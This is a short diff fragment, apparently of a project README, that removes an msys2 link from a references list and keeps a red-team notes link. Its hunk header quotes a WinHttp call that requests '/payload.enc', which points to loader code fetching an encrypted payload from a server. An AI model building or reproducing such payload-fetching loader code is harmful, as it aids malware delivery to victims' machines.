@@ -18,5 +18,4 @@ HINTERNET hRequest = pWinHttpOpenRequest(hConnect, GET, L"/payload.enc", NULL, 0
 ```
 
 ## Useful References
-- https://www.msys2.org/
 - https://www.ired.team/
